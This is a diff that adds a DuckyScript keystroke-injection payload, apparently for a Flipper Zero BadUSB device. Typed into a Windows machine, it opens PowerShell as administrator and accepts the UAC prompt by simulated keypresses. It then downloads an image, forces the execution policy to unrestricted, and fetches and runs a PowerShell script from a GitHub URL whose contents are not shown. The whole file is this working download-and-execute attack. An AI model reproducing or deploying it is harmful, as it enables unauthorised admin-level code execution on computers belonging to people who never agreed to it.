@@ -1,0 +1,29 @@
+GUI d
+DELAY 100
+REM Start powershell as admin
+GUI r
+DELAY 300
+STRING powershell.exe
+DELAY 200
+CTRL-SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 200
+ENTER
+DELAY 500
+STRING cd C:\Users\Public\Pictures
+ENTER
+STRING iwr -uri https://static-1.ivoox.com/audios/2/4/4/6/7511613526442_XXL.jpg?ts=1613526676 -OutFile chirou.jpg
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy unrestricted -Force
+ENTER
+DELAY 100
+STRING iwr -uri https://raw.githubusercontent.com/KermitPurple96/Flipper-zero-bad-USB/main/chirou.ps1 -OutFile chirou.ps1
+ENTER
+DELAY 100
+STRING .\chirou.ps1
+DELAY 100
+ENTER
+STRING exit
+ENTER
